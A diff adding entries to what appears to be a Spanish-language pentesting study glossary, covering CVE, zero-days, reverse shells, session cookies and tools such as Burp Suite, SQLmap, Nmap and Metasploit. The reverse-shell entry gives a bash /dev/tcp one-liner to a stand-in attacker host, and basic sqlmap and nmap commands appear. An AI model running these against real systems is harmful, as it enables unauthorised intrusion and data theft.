@@ -58,18 +58,56 @@ Permite al atacante ejecutar comandos del sistema operativo desde el navegador. 
 Sistema Gestor de Base de Datos: motor que administra los datos.
 Ejemplos: MySQL, PostgreSQL, SQL Server, Oracle, SQLite. Cada uno tiene su propio dialecto SQL, funciones y comentarios. Identificar el SGBD es clave en ataques de inyección para usar el payload correcto.
 
-##Payload
+## Payload
 Dato malicioso enviado al objetivo para explotar una vulnerabilidad
 Es la parte del ataque que hace el daño. En SQLi, sería la cadena con comillas y comandos SQL. En XSS, sería el tag <script>. Los payloads se adaptan según el contexto y la tecnología objetivo.
 
-##Footprinting
+## Footprinting
 Recolección pasiva de información sobre el objetivo antes de atacar.
 Primera fase de un pentest. Incluye búsqueda en WHOIS, DNS, Google Dorks, Shodan, redes sociales. No se interactúa directamente con el objetivo para no dejar rastro ni activar alertas.
 
-##Fingerprinting
+## Fingerprinting
 Identificación del software, versiones y tecnologías del objetivo.
 Se detecta el servidor web (Apache, Nginx), lenguaje (PHP, ASP), CMS (WordPress), SGBD, etc. Puede hacerse analizando headers HTTP, errores, extensiones de archivos, o herramientas como WhatWeb.
 
-##Pentest
+## Pentest
 Prueba de penetración: ataque ético y controlado para encontrar vulnerabilidades.
 Proceso autorizado de simular ataques reales para identificar debilidades. Se divide en fases: reconocimiento, escaneo, explotación, post-explotación y reporte. Diferente a hacking malicioso por el permiso explícito.
+
+## CVE
+Common Vulnerabilities and Exposures: registro público de vulnerabilidades conocidas.
+Base de datos global de vulnerabilidades con identificador único (ej: CVE-2021-44228 es Log4Shell). Permite a empresas y herramientas referenciar vulnerabilidades de forma estandarizada.
+
+## Zero-Day
+Vulnerabilidad desconocida para el fabricante, sin parche disponible.
+El término viene de que el fabricante tiene 'cero días' para reaccionar. Son extremadamente valiosas porque no hay defensa directa. Se usan en ataques dirigidos o se venden en mercados especializados.
+
+## Reverse Shell
+Conexión iniciada desde el servidor comprometido hacia el atacante.
+A diferencia de una shell normal, aquí es el servidor víctima quien se conecta al atacante. Útil para evadir firewalls que bloquean conexiones entrantes. Ejemplo: bash -i >& /dev/tcp/attacker-ip/4444 0>&1.
+
+## Cookie de sesión
+Token que identifica a un usuario autenticado en el servidor.
+Tras el login, el servidor entrega una cookie con un ID de sesión. Si el atacante la roba (vía XSS o MITM), puede suplantar al usuario sin necesidad de contraseña. Deben ser HttpOnly, Secure y con SameSite.
+
+# **Herramientas**
+
+## Burp Suite
+Plataforma de pruebas de seguridad web con proxy interceptor.
+Permite interceptar, modificar y repetir peticiones HTTP. Sus módulos principales son: Proxy, Repeater, Intruder (fuerza bruta), Scanner y Decoder. Es la herramienta más usada en pentesting web.
+
+## SQLmap
+Herramienta automática para detectar y explotar inyecciones SQL.
+Automatiza la detección y explotación de SQLi. Puede extraer bases de datos completas, credenciales y archivos del servidor. Uso básico: sqlmap -u 'http://site.com/page?id=1' --dbs.
+
+## Nmap
+Escáner de red para descubrir hosts y servicios abiertos.
+Detecta puertos abiertos, versiones de servicios y sistema operativo. Comando básico: nmap -sV -sC target.com. También puede ejecutar scripts NSE para detectar vulnerabilidades conocidas.
+
+## Metasploit
+Framework de explotación con módulos para cientos de vulnerabilidades.
+Permite buscar, configurar y lanzar exploits contra sistemas vulnerables. Incluye payloads para obtener shells remotas (Meterpreter). Muy usado en entornos de laboratorio y CTFs.
+
+## Gobuster / Dirb
+Fuerza bruta de directorios y archivos ocultos en servidores web.
+Prueban listas de palabras contra el servidor para encontrar rutas ocultas como /admin, /backup.zip, /.env. Esencial en la fase de reconocimiento activo.
